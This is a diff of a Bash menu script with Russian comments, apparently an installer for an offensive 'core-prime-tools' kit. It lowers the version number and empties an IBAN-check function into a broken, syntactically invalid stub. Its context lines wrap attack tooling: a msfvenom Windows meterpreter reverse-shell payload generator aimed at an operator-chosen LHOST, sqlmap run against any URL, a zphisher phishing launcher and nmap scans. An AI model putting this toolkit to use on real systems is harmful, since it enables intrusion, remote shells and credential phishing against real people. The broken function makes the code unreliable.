@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # --- ВЕРСИЯ И ОБНОВЛЕНИЕ ---
-CURRENT_VERSION="33.9"
+CURRENT_VERSION="33.8"
 UPDATE_URL="https://raw.githubusercontent.com/szp2025/core-prime-tools/main/install_all.sh"
 G='\033[0;32m'; Y='\033[1;33m'; R='\033[0;31m'; B='\033[0;34m'; NC='\033[0m'
 
@@ -1145,7 +1145,8 @@ pc_gen_payload() { read -p "LHOST: " lh; msfvenom -p windows/x64/meterpreter/rev
 
 # --- Системные функции ---
 run_sqlmap() { read -p "URL: " u; [ -n "$u" ] && sqlmap -u "$u" --batch --random-agent; pause; }
-run_iban_scan() { read -p "IBAN: " i; python3 /root/iban_check.py "$(echo $i | tr -d ' ')"; pause; }
+run_iban_scan() { 
+ }
 run_phishing() { [ -d "/root/zphisher" ] && cd /root/zphisher && ./zphisher.sh; }
 run_ghost_scan() { read -p "IP: " t; nmap -F "$t"; pause; }
 run_repair() { repair; echo -e "${G}[+] Cleaned${NC}"; pause; }
